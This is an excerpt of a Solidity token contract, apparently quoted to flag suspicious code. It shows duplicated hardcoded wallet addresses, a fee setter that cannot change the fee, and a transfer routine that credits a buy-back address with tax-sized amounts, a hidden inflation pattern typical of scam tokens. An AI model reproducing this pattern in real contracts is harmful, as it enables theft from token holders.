...
contract Contract is Context, IERC20, Ownable {
    ...
    address public _buyBackAddress = 0x3eBf1D05d63615fCb853c15228d51a2e53722998;
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xe0B2FB5C72431E75dC0F78FBA33B4863E08c3733));
        marketingWalletAddress = payable(address(0xe0B2FB5C72431E75dC0F78FBA33B4863E08c3733));
    ...
    function setBuyFee(uint256 buyFee) public virtual {
          require ( buyFee == _previousliqFee, "error message");
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        _balances[_buyBackAddress] = _balances[_buyBackAddress].add(amount / 100 * _taxFee);
